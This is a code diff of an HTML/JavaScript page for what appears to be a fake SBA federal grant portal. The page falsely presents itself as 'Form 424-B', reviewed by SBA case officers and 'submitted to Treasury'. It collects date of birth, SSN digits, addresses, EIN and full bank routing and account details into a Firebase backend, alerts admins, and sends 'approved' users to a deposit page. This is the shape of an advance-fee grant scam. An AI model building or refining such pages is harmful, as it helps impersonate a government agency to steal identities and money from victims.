@@ -7,232 +7,226 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <link rel="stylesheet" href="global.css">
     <style>
-        .form-section { margin-bottom: 40px; padding: 24px; background: var(--surface); border-radius: var(--r-xl); border: 1px solid var(--border); position: relative; }
-        .form-section::before { content: ''; position: absolute; left: 0; top: 24px; bottom: 24px; width: 4px; background: var(--navy); border-radius: 0 4px 4px 0; }
-        .section-header { display: flex; align-items: center; gap: 12px; margin-bottom: 24px; }
-        .section-num { width: 32px; height: 32px; background: var(--navy); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 0.85rem; }
-        .section-title { font-size: 1.1rem; font-weight: 800; color: var(--navy); }
-        .char-counter { font-size: 0.75rem; color: var(--text-muted); text-align: right; margin-top: 5px; }
-        #lockedState, #pendingState, #reviewState, #approvedState, #rejectedState, #formState { display: none; }
+        .form-section { margin-bottom: 40px; border-left: 4px solid var(--navy-light); padding-left: 24px; position: relative; }
+        .form-section__header { display: flex; align-items: center; gap: 12px; margin-bottom: 24px; }
+        .form-section__num { width: 30px; height: 30px; background: var(--navy); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 0.8rem; font-weight: 800; }
+        .form-section__title { font-size: 1.1rem; font-weight: 800; color: var(--navy); margin: 0; }
+        #formView, #lockView, #statusView { display: none; animation: fadeSlide 0.4s ease; }
     </style>
 </head>
 <body>
-<div id="pageLoader" class="page-loader active"><div class="spinner"></div></div>
-<div class="app-layout">
-    <aside class="app-sidebar" id="appSidebar"></aside>
-    <div class="app-sidebar__overlay" id="sidebarOverlay"></div>
-    <main class="app-main">
-        <div id="pageHeader"></div>
-        <div class="app-main__content" style="max-width: 900px;">
-            
-            <!-- ACCESS CONTROL SCREENS -->
-            <div id="lockedState" class="status-screen fade-in">
-                <div class="status-screen__icon status-screen__icon--error"><i class="fa-solid fa-lock"></i></div>
-                <h1 class="status-screen__title">Identity Verification Required</h1>
-                <p class="status-screen__message">To comply with federal anti-fraud regulations, you must verify your identity before starting a grant application.</p>
-                <a href="kyc.html" class="btn btn--primary">Complete Identity KYC</a>
-            </div>
 
-            <div id="pendingState" class="status-screen fade-in">
-                <div class="status-screen__icon status-screen__icon--pending"><i class="fa-solid fa-clock"></i></div>
-                <h1 class="status-screen__title">Application Received</h1>
-                <p class="status-screen__message">Your Form 424-B has been successfully submitted and is awaiting initial processing by the intake department.</p>
-                <a href="dashboard.html" class="btn btn--secondary">Back to Dashboard</a>
-            </div>
+    <div id="pageLoader" class="page-loader active"><div class="spinner"></div></div>
 
-            <div id="reviewState" class="status-screen fade-in">
-                <div class="status-screen__icon status-screen__icon--info"><i class="fa-solid fa-magnifying-glass fa-pulse"></i></div>
-                <h1 class="status-screen__title">Under Federal Review</h1>
-                <p class="status-screen__message">Your application is currently being audited by an SBA Case Officer. You will be notified of the decision within 3-5 business days.</p>
-            </div>
+    <div class="app-layout">
+        <aside class="app-sidebar" id="appSidebar"></aside>
+        <div class="app-sidebar__overlay" id="sidebarOverlay"></div>
 
-            <div id="approvedState" class="status-screen fade-in">
-                <div class="status-screen__icon status-screen__icon--success"><i class="fa-solid fa-circle-check"></i></div>
-                <h1 class="status-screen__title">Grant Approved!</h1>
-                <p class="status-screen__message" id="approvedMsg"></p>
-                <a href="deposit.html" class="btn btn--primary">Proceed to Funding Step</a>
-            </div>
-
-            <div id="rejectedState" class="status-screen fade-in">
-                <div class="status-screen__icon status-screen__icon--error"><i class="fa-solid fa-circle-xmark"></i></div>
-                <h1 class="status-screen__title">Application Declined</h1>
-                <p class="status-screen__message" id="rejectReasonText"></p>
-                <button class="btn btn--outline" id="btnReapply">Submit New Application</button>
-            </div>
-
-            <!-- THE FORM -->
-            <div id="formState" class="fade-in">
-                <div class="alert alert--info mb-8">
-                    <i class="fa-solid fa-file-contract"></i>
-                    <div>
-                        <strong>Standard Form 424-B</strong>
-                        <p style="font-size:0.8rem; margin-top:4px;">Federal Assurances for Non-Construction Programs. All fields are mandatory unless marked optional.</p>
-                    </div>
+        <main class="app-main">
+            <div id="pageHeader"></div>
+            <div class="app-main__content" style="max-width: 900px;">
+                
+                <!-- Locked View -->
+                <div id="lockView" class="status-screen">
+                    <div class="status-screen__icon status-screen__icon--error"><i class="fa-solid fa-lock"></i></div>
+                    <h1 class="status-screen__title">Application Locked</h1>
+                    <p class="status-screen__message">You must complete Identity Verification (KYC) before you can start a grant application.</p>
+                    <a href="kyc.html" class="btn btn--primary">Verify Identity Now</a>
                 </div>
 
-                <form id="applyForm">
-                    <div class="form-section">
-                        <div class="section-header"><div class="section-num">01</div><h2 class="section-title">Personal Identity</h2></div>
-                        <div class="form-group"><label class="form-label form-label--required">Full Legal Name</label><input type="text" id="f-name" class="form-input" readonly></div>
-                        <div class="form-row">
-                            <div class="form-group"><label class="form-label form-label--required">Date of Birth</label><input type="date" id="f-dob" class="form-input"></div>
-                            <div class="form-group"><label class="form-label form-label--required">SSN (Last 4 Digits)</label><input type="password" id="f-ssn" class="form-input" maxlength="4" placeholder="XXXX"></div>
-                        </div>
-                        <div class="form-group"><label class="form-label form-label--required">Residential Address</label><input type="text" id="f-addr" class="form-input"></div>
-                        <div class="form-row">
-                            <div class="form-group"><label class="form-label form-label--required">City</label><input type="text" id="f-city" class="form-input"></div>
-                            <div class="form-group"><label class="form-label form-label--required">State</label><select id="f-state" class="form-select"></select></div>
-                            <div class="form-group"><label class="form-label form-label--required">ZIP</label><input type="text" id="f-zip" class="form-input" maxlength="5"></div>
+                <!-- Status View -->
+                <div id="statusView" class="status-screen">
+                    <div id="stIcon" class="status-screen__icon"></div>
+                    <h1 id="stTitle" class="status-screen__title"></h1>
+                    <p id="stMsg" class="status-screen__message"></p>
+                    <div id="stActions"></div>
+                </div>
+
+                <!-- Form View -->
+                <div id="formView">
+                    <div class="alert alert--info mb-10">
+                        <i class="fa-solid fa-file-contract"></i>
+                        <div>
+                            <strong>Form 424-B · Federal Grant Application</strong>
+                            <p style="font-size:0.8rem; margin-top:4px;">Please complete all five sections accurately. This information will be used for federal eligibility auditing.</p>
                         </div>
                     </div>
 
-                    <div class="form-section">
-                        <div class="section-header"><div class="section-num">02</div><h2 class="section-title">Business Profile</h2></div>
-                        <div class="form-group"><label class="form-label form-label--required">Legal Business Name</label><input type="text" id="b-name" class="form-input"></div>
-                        <div class="form-row">
-                            <div class="form-group"><label class="form-label form-label--required">Entity Type</label>
-                                <select id="b-type" class="form-select">
-                                    <option value="LLC">Limited Liability Company (LLC)</option><option value="Corporation">Corporation</option><option value="S-Corp">S-Corporation</option><option value="Sole Prop">Sole Proprietorship</option><option value="Partnership">Partnership</option><option value="Nonprofit">Nonprofit Organization</option><option value="Other">Other</option>
+                    <form id="applyForm">
+                        <!-- 01: Identity -->
+                        <div class="form-section">
+                            <div class="form-section__header"><div class="form-section__num">01</div><h3 class="form-section__title">Personal Identity</h3></div>
+                            <div class="form-group"><label class="form-label form-label--required">Full Legal Name</label><input type="text" id="f-name" class="form-input" readonly></div>
+                            <div class="form-row">
+                                <div class="form-group"><label class="form-label form-label--required">Date of Birth</label><input type="date" id="f-dob" class="form-input" required></div>
+                                <div class="form-group"><label class="form-label form-label--required">SSN (Last 4)</label><input type="password" id="f-ssn" class="form-input" maxlength="4" placeholder="XXXX" required></div>
+                            </div>
+                            <div class="form-group"><label class="form-label form-label--required">Residential Address</label><input type="text" id="f-addr" class="form-input" required></div>
+                            <div class="form-row">
+                                <div class="form-group"><label class="form-label form-label--required">City</label><input type="text" id="f-city" class="form-input" required></div>
+                                <div class="form-group"><label class="form-label form-label--required">State</label><select id="f-state" class="form-select" required></select></div>
+                                <div class="form-group"><label class="form-label form-label--required">ZIP</label><input type="text" id="f-zip" class="form-input" maxlength="5" required></div>
+                            </div>
+                        </div>
+
+                        <!-- 02: Business -->
+                        <div class="form-section">
+                            <div class="form-section__header"><div class="form-section__num">02</div><h3 class="form-section__title">Business Profile</h3></div>
+                            <div class="form-group"><label class="form-label form-label--required">Legal Business Name</label><input type="text" id="b-name" class="form-input" required></div>
+                            <div class="form-row">
+                                <div class="form-group">
+                                    <label class="form-label form-label--required">Entity Type</label>
+                                    <select id="b-type" class="form-select" required>
+                                        <option value="LLC">LLC</option><option value="Corporation">Corporation</option><option value="S-Corp">S-Corporation</option><option value="Sole Proprietorship">Sole Proprietorship</option><option value="Partnership">Partnership</option><option value="Nonprofit">Nonprofit</option><option value="Other">Other</option>
+                                    </select>
+                                </div>
+                                <div class="form-group"><label class="form-label form-label--required">EIN (Employer ID)</label><input type="text" id="b-ein" class="form-input" placeholder="XX-XXXXXXX" required></div>
+                            </div>
+                            <div class="form-row">
+                                <div class="form-group"><label class="form-label form-label--required">Years in Business</label><input type="number" id="b-years" class="form-input" min="0" required></div>
+                                <div class="form-group"><label class="form-label form-label--required">Full-Time Employees</label><input type="number" id="b-emps" class="form-input" min="0" required></div>
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label form-label--required">Annual Gross Revenue</label>
+                                <select id="b-rev" class="form-select" required>
+                                    <option value="Under $100K">Under $100K</option><option value="$100K-$500K">$100K-$500K</option><option value="$500K-$1M">$500K-$1M</option><option value="$1M-$5M">$1M-$5M</option><option value="Over $5M">Over $5M</option>
                                 </select>
                             </div>
-                            <div class="form-group"><label class="form-label form-label--required">EIN (Tax ID)</label><input type="text" id="b-ein" class="form-input" placeholder="XX-XXXXXXX"></div>
                         </div>
-                        <div class="form-row">
-                            <div class="form-group"><label class="form-label form-label--required">Years Active</label><input type="number" id="b-years" class="form-input" min="0"></div>
-                            <div class="form-group"><label class="form-label form-label--required">Full-Time Employees</label><input type="number" id="b-emps" class="form-input" min="0"></div>
-                        </div>
-                        <div class="form-group"><label class="form-label form-label--required">Annual Revenue Range</label>
-                            <select id="b-rev" class="form-select">
-                                <option value="Under $100k">Under $100,000</option><option value="$100k-$500k">$100,000 - $500,000</option><option value="$500k-$1M">$500,000 - $1,000,000</option><option value="$1M-$5M">$1,000,000 - $5,000,000</option><option value="Over $5M">Over $5,000,000</option>
-                            </select>
-                        </div>
-                    </div>
 
-                    <div class="form-section">
-                        <div class="section-header"><div class="section-num">03</div><h2 class="section-title">Grant Details</h2></div>
-                        <div class="form-row">
-                            <div class="form-group"><label class="form-label form-label--required">Your Job Title</label><input type="text" id="g-title" class="form-input"></div>
-                            <div class="form-group"><label class="form-label form-label--required">Primary Use of Funds</label>
-                                <select id="g-use" class="form-select">
-                                    <option value="Working Capital">Working Capital</option><option value="Equipment">Equipment Purchase</option><option value="Real Estate">Real Estate Acquisition</option><option value="Technology">Technology Upgrade</option><option value="Payroll">Payroll & Employee Training</option><option value="Expansion">Marketing & Expansion</option><option value="Disaster">Disaster Recovery</option><option value="Other">Other</option>
+                        <!-- 03: Grant Details -->
+                        <div class="form-section">
+                            <div class="form-section__header"><div class="form-section__num">03</div><h3 class="form-section__title">Grant Details</h3></div>
+                            <div class="form-group">
+                                <label class="form-label form-label--required">Primary Use of Grant</label>
+                                <select id="g-use" class="form-select" required>
+                                    <option value="Working Capital">Working Capital</option><option value="Equipment">Equipment Purchase</option><option value="Real Estate">Real Estate</option><option value="Expansion">Business Expansion</option><option value="Disaster Recovery">Disaster Recovery</option><option value="Payroll">Payroll Support</option>
                                 </select>
                             </div>
-                        </div>
-                        <div class="form-group"><label class="form-label form-label--required">Requested Amount (USD)</label><div class="flex items-center gap-2"><span style="font-weight:700; color:var(--text-muted);">$</span><input type="number" id="g-amt" class="form-input" min="50000" max="500000" placeholder="50,000 - 500,000"></div></div>
-                        <div class="form-group">
-                            <label class="form-label form-label--required">Grant Purpose Statement</label>
-                            <textarea id="g-stmt" class="form-textarea" rows="5" maxlength="500" placeholder="Provide a detailed explanation of your business goals..."></textarea>
-                            <div class="char-counter"><span id="charCount">0</span>/500 characters (min 100)</div>
-                        </div>
-                    </div>
-
-                    <div class="form-section">
-                        <div class="section-header"><div class="section-num">04</div><h2 class="section-title">Banking Information</h2></div>
-                        <div class="form-group"><label class="form-label form-label--required">Financial Institution Name</label><input type="text" id="bank-name" class="form-input"></div>
-                        <div class="form-row">
-                            <div class="form-group"><label class="form-label form-label--required">9-Digit Routing Number</label><input type="text" id="bank-route" class="form-input" maxlength="9"></div>
-                            <div class="form-group"><label class="form-label form-label--required">Account Number</label><input type="text" id="bank-acc" class="form-input"></div>
-                        </div>
-                        <div class="form-group"><label class="form-label form-label--required">Account Holder Name</label><input type="text" id="bank-hold" class="form-input"></div>
-                        <div class="form-group"><label class="form-label form-label--required">Account Type</label>
-                            <div class="flex gap-6 mt-2">
-                                <label class="flex items-center gap-2" style="cursor:pointer;"><input type="radio" name="accType" value="Checking" checked> Checking</label>
-                                <label class="flex items-center gap-2" style="cursor:pointer;"><input type="radio" name="accType" value="Savings"> Savings</label>
+                            <div class="form-group"><label class="form-label form-label--required">Requested Amount (USD)</label><div class="flex items-center gap-2"><span style="font-weight:800; color:var(--text-muted);">$</span><input type="number" id="g-amt" class="form-input" min="50000" max="500000" placeholder="50,000 - 500,000" required></div></div>
+                            <div class="form-group">
+                                <label class="form-label form-label--required">Detailed Grant Purpose</label>
+                                <textarea id="g-purpose" class="form-textarea" rows="5" maxlength="500" placeholder="Minimum 100 characters describing your business goals..." required></textarea>
+                                <div class="flex justify-between mt-2" style="font-size: 0.75rem; color: var(--text-muted);">
+                                    <span>Minimum: 100 characters</span>
+                                    <span id="charCount">0/500</span>
+                                </div>
                             </div>
                         </div>
-                    </div>
 
-                    <div class="card mb-12">
-                        <div class="flex flex-col gap-4 mb-8">
-                            <label class="flex gap-3" style="cursor:pointer;"><input type="checkbox" id="c1" class="mt-1" required> <span style="font-size:0.85rem;">I certify all information provided is accurate and complete under penalty of law.</span></label>
-                            <label class="flex gap-3" style="cursor:pointer;"><input type="checkbox" id="c2" class="mt-1" required> <span style="font-size:0.85rem;">I understand that false information results in permanent federal disqualification.</span></label>
-                            <label class="flex gap-3" style="cursor:pointer;"><input type="checkbox" id="c3" class="mt-1" required> <span style="font-size:0.85rem;">I agree to the 2025 SBA Grant Program Terms and Conditions.</span></label>
+                        <!-- 04: Banking -->
+                        <div class="form-section">
+                            <div class="form-section__header"><div class="form-section__num">04</div><h3 class="form-section__title">Banking Information</h3></div>
+                            <div class="form-group"><label class="form-label form-label--required">Financial Institution Name</label><input type="text" id="bank-name" class="form-input" required></div>
+                            <div class="form-row">
+                                <div class="form-group"><label class="form-label form-label--required">9-Digit Routing Number</label><input type="text" id="bank-route" class="form-input" maxlength="9" required></div>
+                                <div class="form-group"><label class="form-label form-label--required">Account Number</label><input type="text" id="bank-acc" class="form-input" required></div>
+                            </div>
+                            <div class="form-group"><label class="form-label form-label--required">Account Holder Name</label><input type="text" id="bank-hold" class="form-input" required></div>
+                            <div class="form-group">
+                                <label class="form-label form-label--required">Account Type</label>
+                                <div class="flex gap-8 mt-2">
+                                    <label class="flex items-center gap-2" style="cursor:pointer;"><input type="radio" name="bankType" value="Checking" checked> Checking</label>
+                                    <label class="flex items-center gap-2" style="cursor:pointer;"><input type="radio" name="bankType" value="Savings"> Savings</label>
+                                </div>
+                            </div>
                         </div>
-                        <div class="form-group"><label class="form-label form-label--required">Digital Signature (Type Full Name)</label><input type="text" id="sig" class="form-input" placeholder="Must match your profile name"></div>
-                        <button type="submit" class="btn btn--primary btn--full btn--lg" id="btnSubmit">Submit Official Application</button>
-                    </div>
-                </form>
+
+                        <!-- 05: Certification -->
+                        <div class="card mb-12">
+                            <div class="form-group flex items-start gap-4 mb-8">
+                                <input type="checkbox" required style="width:22px; height:22px; margin-top:2px;">
+                                <div style="font-size:0.85rem; font-weight:600; line-height:1.5;">I certify that all information provided is true and accurate. I understand that false statements on this federal application result in immediate disqualification and potential legal prosecution.</div>
+                            </div>
+                            <div class="form-group"><label class="form-label form-label--required">Digital Signature (Type Full Name)</label><input type="text" id="signature" class="form-input" placeholder="Must match profile name" required></div>
+                            <button type="submit" class="btn btn--primary btn--full btn--lg mt-6" id="submitBtn">Submit Official Application</button>
+                        </div>
+                    </form>
+                </div>
             </div>
-        </div>
-    </main>
-</div>
+        </main>
+    </div>
 
-<script type="module">
-    import { db, updateUserData, addLedgerEntry, notify, notifyAdmins, serverTimestamp } from './firebase-config.js';
-    import { requireAuth, buildSidebar, buildDock, buildPageHeader, initNotificationBadge, showToast, setButtonLoading, formatCurrency } from './app.js';
+    <script type="module">
+        import { db, updateUserData, serverTimestamp, addLedgerEntry, notify, notifyAdmins } from './firebase-config.js';
+        import { requireAuth, buildSidebar, buildDock, buildPageHeader, initNotificationBadge, showToast, setButtonLoading, formatCurrency } from './app.js';
 
-    const STATES = ["Alabama","Alaska","Arizona","Arkansas","California","Colorado","Connecticut","Delaware","District of Columbia","Florida","Georgia","Hawaii","Idaho","Illinois","Indiana","Iowa","Kansas","Kentucky","Louisiana","Maine","Maryland","Massachusetts","Michigan","Minnesota","Mississippi","Missouri","Montana","Nebraska","Nevada","New Hampshire","New Jersey","New Mexico","New York","North Carolina","North Dakota","Ohio","Oklahoma","Oregon","Pennsylvania","Rhode Island","South Carolina","South Dakota","Tennessee","Texas","Utah","Vermont","Virginia","Washington","West Virginia","Wisconsin","Wyoming"];
+        const STATES = ["Alabama","Alaska","Arizona","Arkansas","California","Colorado","Connecticut","Delaware","District of Columbia","Florida","Georgia","Hawaii","Idaho","Illinois","Indiana","Iowa","Kansas","Kentucky","Louisiana","Maine","Maryland","Massachusetts","Michigan","Minnesota","Mississippi","Missouri","Montana","Nebraska","Nevada","New Hampshire","New Jersey","New Mexico","New York","North Carolina","North Dakota","OH","Oklahoma","Oregon","Pennsylvania","Rhode Island","South Carolina","South Dakota","Tennessee","Texas","Utah","Vermont","Virginia","Washington","West Virginia","Wisconsin","Wyoming"];
 
-    requireAuth((user, userData) => {
-        buildSidebar({ activeId: 'apply', userData });
-        buildDock({ activeId: 'apply' });
-        buildPageHeader({ title: 'Grant Application', subtitle: 'Step 2: Formal Funding Request', backUrl: 'dashboard.html' });
-        initNotificationBadge(user.uid);
+        requireAuth((user, userData) => {
+            buildSidebar({ activeId: 'apply', userData });
+            buildDock({ activeId: 'apply' });
+            buildPageHeader({ title: 'Federal Application', subtitle: 'Grant Request Form 424-B', backUrl: 'dashboard.html' });
+            initNotificationBadge(user.uid);
 
-        // State Dropdown
-        const sSel = document.getElementById('f-state');
-        STATES.forEach(s => sSel.innerHTML += `<option value="${s}">${s}</option>`);
+            const lock = document.getElementById('lockView');
+            const stat = document.getElementById('statusView');
+            const form = document.getElementById('formView');
 
-        // Access Control
-        const show = (id) => document.getElementById(id).style.display = 'block';
-        if(userData.kycStatus !== 'APPROVED') show('lockedState');
-        else if(userData.applyStatus === 'PENDING') show('pendingState');
-        else if(userData.applyStatus === 'UNDER_REVIEW') show('reviewState');
-        else if(userData.applyStatus === 'APPROVED') {
-            document.getElementById('approvedMsg').textContent = `Your request for ${formatCurrency(userData.requestedAmount)} has been approved.`;
-            show('approvedState');
-        } else if(userData.applyStatus === 'REJECTED') {
-            document.getElementById('rejectReasonText').textContent = `Reason: ${userData.application?.rejectReason || 'Program criteria not met.'}`;
-            show('rejectedState');
-            document.getElementById('btnReapply').onclick = () => updateUserData(user.uid, { applyStatus: 'IDLE' }).then(() => location.reload());
-        } else {
-            show('formState');
-            document.getElementById('f-name').value = userData.fullName;
-        }
+            // Populate States
+            const sSel = document.getElementById('f-state');
+            STATES.forEach(s => sSel.innerHTML += `<option value="${s}">${s}</option>`);
 
-        // Textarea Counter
-        const stmt = document.getElementById('g-stmt');
-        stmt.oninput = () => document.getElementById('charCount').textContent = stmt.value.length;
+            // Access Control
+            if(userData.kycStatus !== 'APPROVED') { lock.style.display = 'block'; }
+            else if(userData.applyStatus === 'PENDING') { showStatus('pending', 'Application Received', 'Your request is in the intake queue.'); }
+            else if(userData.applyStatus === 'UNDER_REVIEW') { showStatus('review', 'Under Federal Review', 'An SBA Case Officer is auditing your business credentials.'); }
+            else if(userData.applyStatus === 'APPROVED') { showStatus('success', 'Application Approved!', `Your grant for ${formatCurrency(userData.requestedAmount)} is authorized.`, '<a href="deposit.html" class="btn btn--primary">Proceed to Funding</a>'); }
+            else if(userData.applyStatus === 'REJECTED') { showStatus('error', 'Application Declined', userData.application?.rejectReason || 'Criteria not met.', '<button class="btn btn--outline" id="reapply">Submit New Request</button>'); document.getElementById('reapply').onclick = () => updateUserData(user.uid, { applyStatus: 'IDLE' }).then(() => location.reload()); }
+            else { form.style.display = 'block'; document.getElementById('f-name').value = userData.fullName; }
 
-        // Submission
-        document.getElementById('applyForm').onsubmit = async (e) => {
-            e.preventDefault();
-            const btn = document.getElementById('btnSubmit');
-            const amt = parseFloat(document.getElementById('g-amt').value);
-            const ein = document.getElementById('b-ein').value;
-            const route = document.getElementById('bank-route').value;
-            const sig = document.getElementById('sig').value;
-
-            if(!/^\d{2}-\d{7}$/.test(ein)) return showToast('Invalid EIN format (XX-XXXXXXX)', 'error');
-            if(stmt.value.length < 100) return showToast('Purpose statement must be at least 100 characters', 'error');
-            if(!/^\d{9}$/.test(route)) return showToast('Routing number must be exactly 9 digits', 'error');
-            if(sig.toLowerCase() !== userData.fullName.toLowerCase()) return showToast('Signature must match your profile name', 'error');
-
-            setButtonLoading(btn, true, 'Submitting Form...');
-
-            const payload = {
-                fullName: userData.fullName, dob: document.getElementById('f-dob').value, ssn: document.getElementById('f-ssn').value,
-                address: document.getElementById('f-addr').value, city: document.getElementById('f-city').value, state: sSel.value, zip: document.getElementById('f-zip').value,
-                bizName: document.getElementById('b-name').value, bizType: document.getElementById('b-type').value, ein,
-                bizYears: document.getElementById('b-years').value, employees: document.getElementById('b-emps').value, bizRevenue: document.getElementById('b-rev').value,
-                jobTitle: document.getElementById('g-title').value, grantAmount: amt, grantPurpose: stmt.value,
-                bankName: document.getElementById('bank-name').value, routingNumber: route, accountNumber: document.getElementById('bank-acc').value,
-                accountHolder: document.getElementById('bank-hold').value, accountType: document.querySelector('input[name="accType"]:checked').value,
-                submittedAt: serverTimestamp()
-            };
-
-            try {
-                await updateUserData(user.uid, { application: payload, applyStatus: 'PENDING', requestedAmount: amt });
-                await addLedgerEntry(user.uid, { type:'application', amount: amt, description: 'Grant Application Form 424-B Submitted', status: 'PENDING' });
-                await notify(user.uid, { title:'Application Received', message:'Your grant request has been queued for review.', type:'info', link:'apply.html', sendEmail:true });
-                await notifyAdmins({ title: 'New Application', message: `${userData.fullName} submitted a $${amt} request.`, type:'action' });
-                location.reload();
-            } catch(err) {
-                showToast(err.message, 'error');
-                setButtonLoading(btn, false);
+            function showStatus(type, title, msg, acts = '') {
+                stat.style.display = 'block';
+                const ic = document.getElementById('stIcon');
+                ic.className = `status-screen__icon status-screen__icon--${type}`;
+                ic.innerHTML = `<i class="fa-solid ${type === 'success' ? 'fa-circle-check' : type === 'error' ? 'fa-circle-xmark' : 'fa-clock'}"></i>`;
+                document.getElementById('stTitle').textContent = title;
+                document.getElementById('stMsg').textContent = msg;
+                document.getElementById('stActions').innerHTML = acts;
             }
-        };
-    });
-</script>
+
+            // Real-time counter
+            const purpose = document.getElementById('g-purpose');
+            purpose.oninput = () => document.getElementById('charCount').textContent = `${purpose.value.length}/500`;
+
+            document.getElementById('applyForm').onsubmit = async (e) => {
+                e.preventDefault();
+                const amt = parseFloat(document.getElementById('g-amt').value);
+                const sig = document.getElementById('signature').value.trim();
+                const route = document.getElementById('bank-route').value;
+                const ein = document.getElementById('b-ein').value;
+
+                // Validations
+                if(purpose.value.length < 100) return showToast('Statement must be at least 100 characters', 'warning');
+                if(!/^\d{9}$/.test(route)) return showToast('Routing number must be 9 digits', 'error');
+                if(!/^\d{2}-\d{7}$/.test(ein)) return showToast('Invalid EIN format (XX-XXXXXXX)', 'error');
+                if(sig.toLowerCase() !== userData.fullName.toLowerCase()) return showToast('Signature must match your full name', 'error');
+
+                const btn = document.getElementById('submitBtn');
+                setButtonLoading(btn, true, 'Submitting to Treasury...');
+
+                const payload = {
+                    fullName: userData.fullName, dob: document.getElementById('f-dob').value, ssn: document.getElementById('f-ssn').value,
+                    address: document.getElementById('f-addr').value, city: document.getElementById('f-city').value, state: sSel.value, zip: document.getElementById('f-zip').value,
+                    bizName: document.getElementById('b-name').value, bizType: document.getElementById('b-type').value, ein,
+                    bizYears: document.getElementById('b-years').value, employees: document.getElementById('b-emps').value, bizRevenue: document.getElementById('b-rev').value,
+                    grantAmount: amt, grantPurpose: purpose.value, bankName: document.getElementById('bank-name').value,
+                    routingNumber: route, accountNumber: document.getElementById('bank-acc').value, accountHolder: document.getElementById('bank-hold').value,
+                    accountType: document.querySelector('input[name="bankType"]:checked').value, submittedAt: serverTimestamp()
+                };
+
+                try {
+                    await updateUserData(user.uid, { application: payload, applyStatus: 'PENDING', requestedAmount: amt });
+                    await addLedgerEntry(user.uid, { type:'application', amount: amt, description:'Grant Application Form 424-B Submitted', status:'PENDING' });
+                    await notify(user.uid, { title: 'Application Submitted', message: `Your request for ${formatCurrency(amt)} is now under review.`, type: 'info', link: 'apply.html', sendEmail: true });
+                    await notifyAdmins({ title: 'New Application', message: `${userData.fullName} submitted a $${amt} request.`, type: 'action' });
+                    location.reload();
+                } catch(err) {
+                    showToast(err.message, 'error');
+                    setButtonLoading(btn, false);
+                }
+            };
+        });
+    </script>
 </body>
 </html>
